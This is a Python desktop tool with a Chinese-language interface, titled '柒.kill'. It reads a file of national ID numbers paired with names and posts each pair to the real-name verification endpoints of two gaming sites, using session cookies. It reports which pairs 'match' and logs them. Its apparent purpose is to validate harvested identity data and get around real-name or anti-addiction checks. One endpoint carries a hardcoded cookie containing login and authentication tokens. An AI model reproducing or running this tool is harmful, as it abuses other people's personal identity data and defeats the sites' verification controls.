#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
from threading import Thread
import threading
import random
import time
try:
    from tkinter import *
except ImportError:  #Python 2.x
    PythonVersion = 2
else:  #Python 3.x
    PythonVersion = 3
    from tkinter.font import Font
    from tkinter.ttk import *
    from tkinter.messagebox import *

class Application_ui(Frame):
    #这个类仅实现界面生成功能，具体事件处理代码在子类Application中。
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master.title('柒.kill')
        self.master.geometry('372x410')
        self.createWidgets()

    def createWidgets(self):
        self.top = self.winfo_toplevel()

        self.style = Style()

        self.Text3Var = StringVar(value='选择接口')
        self.Text3 = Entry(self.top, text='选择接口', textvariable=self.Text3Var, font=('宋体',9))
        self.Text3.place(relx=0.538, rely=0.02, relwidth=0.239, relheight=0.061, conmand=self.thread_it(self.bat))

        self.List1Var = StringVar(value='等待开始',)
        self.List1Font = Font(font=('宋体', 9), )
        self.List1 = Listbox(self.top, listvariable=self.List1Var, font=self.List1Font, )
        # self.List1.insert(1, Application.list1(self))

        self.List1.place(relx=0., rely=0.176, relwidth=0.777, relheight=0.8, )
        self.style.configure('Command1.TButton', font=('宋体', 9))
        self.Command1 = Button(self.top, text='开始运行', command=self.bat, style='Command1.TButton')
        self.Command1.place(relx=0.796, rely=0.02, relwidth=0.175, relheight=0.139,)

        self.Text2Var = StringVar(value='请输入密钥')
        self.Text2 = Entry(self.top, text='请输入密钥', textvariable=self.Text2Var, font=('宋体',9))
        self.Text2.place(relx=0.022, rely=0.098, relwidth=0.497, relheight=0.061)

        self.Text1Var = StringVar(value='请输入文件路径')
        self.Text1 = Entry(self.top, text='请输入文件路径', textvariable=self.Text1Var, font=('宋体',9))
        self.Text1.place(relx=0.022, rely=0.02, relwidth=0.497, relheight=0.061)



class Application(Application_ui):
    #这个类实现具体的事件处理回调函数。界面生成代码在Application_ui中。
    def __init__(self, master=None):
        Application_ui.__init__(self, master)

    def Command1_Cmd(self, event=None):
        # TODO, Please finish the function here!
        pass

    def thread_it(self, func, *args):
        """ 将函数打包进线程 """
        self.myThread = threading.Thread(target=func, args=args)
        # self.myThread.setDaemon(True)  # 主线程退出就直接让子线程跟随退出,不论是否运行完成。
        self.myThread.start()
    def bat(self):
        def b():
            import requests
            import random
            import time
            det = self.Text1.get()
            cookie = self.Text2.get()
            # if det[-1] == "t":
            f = open(f"{det}", "r")
            for line in f.readlines():  # 依次读取每行
                line = line.strip()  # 去掉每行头尾空白
                write = line[0:18]
                name = line[18:22]
                time.sleep(0.5)
                url = "http://www.602.com/index.php?m=mymember&c=idcard&a=index"
                header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36",
                    "Cookie": f"{cookie}"
                }
                data = {
                    "truename": f"{name}",
                    "idcard": f"{write}",
                    "dosubmit": "dosubmit"
                }
                resp = requests.post(url, data=data, headers=header)
                if len(resp.text) == 94:
                    print(name + write + "匹配失败")
                elif len(resp.text) == 77:
                    print(name + write + "匹配失败")
                elif len(resp.text) == 22:
                    print(name + write + "匹配成功")
                    bit = name + write + "匹配成功"
                    self.thread_it(self.List1.insert("2", bit))
                    with open('校验成功.txt', 'a') as file0:
                        print(name + write + "匹配成功", file=file0)
                        break
                else:
                    print("出现问题/接口和谐")
        def a():
            dit = self.Text1.get()
            number = self.Text2.get()
            f = open(f"{dit}", "r")
            for line in f.readlines():  # 依次读取每行
                line = line.strip()  # 去掉每行头尾空白
                write = line[0:18]
                name = line[18:22]
                url = "http://www.4yx.com/fcm/do_apply"
                header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"Hm_lvt_d52eb074ed5073ce76036113dae7af90=1675581522,1676902534,1677071153,1677317146; security_session_verify=ef4614bbb1384d3bed07f529e4e23a02; acw_tc=6f034eb316773171395957633e6359424eaee141b074b1689e7473fbc1; PHPSESSID=69lonacipqvu0p6674jltagg66; __tins__20888221=%7B%22sid%22%3A%201677317145528%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201677318968450%7D; __51cke__=; __51laig__=3; Hm_lpvt_d52eb074ed5073ce76036113dae7af90=1677317169; member_login_state=d36092513177c759c2e6c5c447aa17a4; member_login_auth=MDAwMDAwMDAwMMitrdmNkGWgvYx904uofmyvzoexsImmY7R7qMt-qYJoxma53pWmequ9h3yZetKLacnOe7CwebKss6Gwy36pgqvFZpjRmIx9bayedNh-qXafsqeAqruNr2K-advYjJikrLtntdWVkImgsp182nrTZXM"
                }
                data = {
                    "truename": f"{name}",
                    "idcard": f"{write}",
                    "memberid": f"{number}"
                }
                resp = requests.post(url, headers=header, data=data)

                if len(resp.text) == 72:
                    print(write + name + "匹配成功")
                    bit = write + name + "匹配成功"
                    self.thread_it(self.List1.insert("2", bit))
                    with open('匹配成功.txt', 'a') as file:
                        print(write + name + "匹配成功", file=file)
                    break
                elif len(resp.text) == 87:
                    print(write + name + "匹配失败")
                    bct = write + name + "匹配失败"
        if self.Text3.get() == "1":
            print(a())
        elif self.Text3.get() == "2":
            print(b())
        else:
            btt = "请选择接口"
            self.thread_it(self.List1.insert("2", btt))




if __name__ == "__main__":
    top = Tk()
    Application(top).mainloop()
    try: top.destroy()
    except: pass
